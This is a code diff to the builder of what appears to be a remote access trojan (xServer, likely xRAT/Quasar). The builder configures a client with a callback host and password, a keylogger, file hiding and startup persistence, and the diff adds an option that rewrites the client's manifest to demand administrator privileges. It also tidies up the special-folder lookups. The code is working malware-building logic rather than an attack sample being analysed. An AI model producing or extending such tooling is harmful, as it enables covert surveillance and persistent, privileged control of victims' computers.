@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Xml;
 using Mono.Cecil;
 using Mono.Cecil.Cil;
 using Vestris.ResourceLib;
@@ -33,13 +34,13 @@ namespace xServer.Core.Build
         /// <param name="iconpath">The path to the icon for the client.</param>
         /// <param name="asminfo">Information about the client executable's assembly information.</param>
         /// <param name="version">The version number of the client.</param>
+        /// <param name="requireAdmin">Determines whether to require administrator privileges on startup.</param>
         /// <exception cref="System.Exception">Thrown if the builder was unable to rename the client executable.</exception>
         /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
         /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
         public static void Build(string output, string tag, string host, string password, string installsub, string installname,
             string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger,
-            int reconnectdelay,
-            int installpath, string iconpath, string[] asminfo, string version)
+            int reconnectdelay, int installpath, string iconpath, string[] asminfo, string version, bool requireAdmin)
         {
             // PHASE 1 - Settings
             string encKey = FileHelper.GetRandomFilename(20);
@@ -168,7 +169,23 @@ namespace xServer.Core.Build
                 versionResource.SaveTo(output);
             }
 
-            // PHASE 5 - Icon changing
+            // PHASE 5 - Manifest rewriting to require Administrator privileges on startup
+            if (requireAdmin)
+            {
+                ManifestResource rc = new ManifestResource();
+                rc.LoadFrom(output);
+                var nodes = rc.Manifest.GetElementsByTagName("requestedExecutionLevel");
+                if (nodes == null || nodes.Count == 0)
+                    throw new Exception("Reading Manifest failed");
+                foreach (XmlNode node in nodes)
+                {
+                    node.Attributes["level"].Value = "requireAdministrator";
+                    break;
+                }
+                rc.SaveTo(output);
+            }
+
+            // PHASE 6 - Icon changing
             if (!string.IsNullOrEmpty(iconpath))
                 IconInjector.InjectIcon(output, iconpath);
         }
@@ -184,21 +201,21 @@ namespace xServer.Core.Build
         }
 
         /// <summary>
-        /// Attempts to obtain the signed-integer value of a special folder from the install path value provided.
+        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
         /// </summary>
         /// <param name="installpath">The integer value of the install path.</param>
-        /// <returns>Returns the signed-integer value of the special folder.</returns>
+        /// <returns>Returns the signed-byte value of the special folder.</returns>
         /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
         private static sbyte GetSpecialFolder(int installpath)
         {
             switch (installpath)
             {
                 case 1:
-                    return 26; // Appdata
+                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                 case 2:
-                    return 38; // ProgramFiles
+                    return (sbyte)Environment.SpecialFolder.ProgramFiles;
                 case 3:
-                    return 37; // System
+                    return (sbyte)Environment.SpecialFolder.System;
                 default:
                     throw new ArgumentException("InstallPath");
             }
